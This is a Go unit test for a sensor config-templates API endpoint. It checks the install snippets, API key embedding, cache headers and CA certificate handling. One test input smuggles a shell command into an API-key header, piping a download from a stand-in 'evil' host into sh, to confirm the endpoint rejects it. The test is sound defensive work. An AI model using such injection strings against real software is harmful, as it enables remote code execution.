package handler

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"math/big"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"github.com/openctemio/openctem/api/internal/app/sensor"
	"github.com/openctemio/openctem/api/internal/infra/http/middleware"
	sensordom "github.com/openctemio/openctem/api/pkg/domain/sensor"
	"github.com/openctemio/openctem/api/pkg/logger"
)

// TestSensorConfigTemplates_Endpoint: GET /sensors/{id}/config-templates
// returns every install format, pinned to the configured image, pointed at the
// public URL, with the key only when the caller passes it, and the platform CA
// (and its fingerprint) when SENSOR_CA_CERT_FILE names a certificate.
func TestSensorConfigTemplates_Endpoint(t *testing.T) {
	f := newFleetHarness(t, sensordom.HealthPolicy{})
	f.sh.SetTemplateService(sensor.NewSensorConfigTemplateService("../../../../configs/sensor-templates", logger.NewNop()))
	f.sh.SetPublicAPIURL("https://192.0.2.204")
	f.sh.SetSensorImage("ghcr.io/openctemio/sensor:v0.4.2")

	call := func(key string) (*httptest.ResponseRecorder, SensorConfigTemplatesResponse) {
		t.Helper()
		req := httptest.NewRequest(http.MethodGet, "/api/v1/sensors/"+f.sensorID+"/config-templates", nil)
		if key != "" {
			req.Header.Set("X-Sensor-API-Key", key)
		}
		rctx := chi.NewRouteContext()
		rctx.URLParams.Add("id", f.sensorID)
		ctx := req.Context()
		ctx = context.WithValue(ctx, middleware.TenantIDKey, f.tenantID)
		ctx = context.WithValue(ctx, chi.RouteCtxKey, rctx)
		rec := httptest.NewRecorder()
		f.sh.GetConfigTemplates(rec, req.WithContext(ctx))
		var resp SensorConfigTemplatesResponse
		_ = json.Unmarshal(rec.Body.Bytes(), &resp)
		return rec, resp
	}

	// Without a key: every format, the env-var reference, no CA.
	rec, resp := call("")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d: %s", rec.Code, rec.Body.String())
	}
	for name, s := range map[string]string{
		"yaml": resp.YAML, "env": resp.Env, "docker": resp.Docker, "cli": resp.CLI,
		"compose": resp.Compose, "kubernetes": resp.Kubernetes, "helm": resp.Helm,
	} {
		if strings.TrimSpace(s) == "" {
			t.Errorf("%s snippet is empty", name)
		}
	}
	if resp.Image != "ghcr.io/openctemio/sensor:v0.4.2" || resp.APIURL != "https://192.0.2.204" || resp.APIKeyIncluded {
		t.Errorf("image=%q api_url=%q key_included=%v", resp.Image, resp.APIURL, resp.APIKeyIncluded)
	}
	if !strings.Contains(resp.Docker, "OPENCTEM_API_KEY") || resp.CACertificate != "" || resp.CAFingerprintSHA256 != "" {
		t.Errorf("no-key/no-CA docker:\n%s", resp.Docker)
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store (the response can carry a key)", cc)
	}

	// With the freshly issued key.
	_, resp = call("rda_4b1e0123456789abcdef")
	if !resp.APIKeyIncluded || !strings.Contains(resp.Docker, "-e API_KEY='rda_4b1e0123456789abcdef'") {
		t.Errorf("key not embedded:\n%s", resp.Docker)
	}

	// A header that is not a key shape is refused, not pasted into a shell line.
	if rec, _ := call("rda_x'; curl evil | sh; '"); rec.Code != http.StatusBadRequest {
		t.Errorf("malformed key header: status %d, want 400", rec.Code)
	}

	// The platform CA from SENSOR_CA_CERT_FILE.
	caPath := filepath.Join(t.TempDir(), "openctem-root-ca.crt")
	if err := os.WriteFile(caPath, selfSignedCAPEM(t), 0o600); err != nil {
		t.Fatal(err)
	}
	f.sh.SetCACertificateFile(caPath)
	_, resp = call("")
	if !strings.Contains(resp.CACertificate, "BEGIN CERTIFICATE") || strings.Count(resp.CAFingerprintSHA256, ":") != 31 {
		t.Errorf("ca=%q fingerprint=%q", resp.CACertificate, resp.CAFingerprintSHA256)
	}
	if !strings.Contains(resp.Docker, "SSL_CERT_DIR=/etc/openctem/certs") || !strings.Contains(resp.Compose, "openctem_ca") {
		t.Errorf("CA not installed by the snippets:\n%s", resp.Docker)
	}

	// A CA file that is not a certificate is skipped, never an error page.
	if err := os.WriteFile(caPath, []byte("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rec, resp = call("")
	if rec.Code != http.StatusOK || resp.CACertificate != "" || strings.Contains(resp.Docker, "PRIVATE KEY") {
		t.Errorf("bad CA file: status=%d ca=%q", rec.Code, resp.CACertificate)
	}
}

func selfSignedCAPEM(t *testing.T) []byte {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(7), Subject: pkix.Name{CommonName: "test root"},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
		IsCA: true, BasicConstraintsValid: true, KeyUsage: x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
}
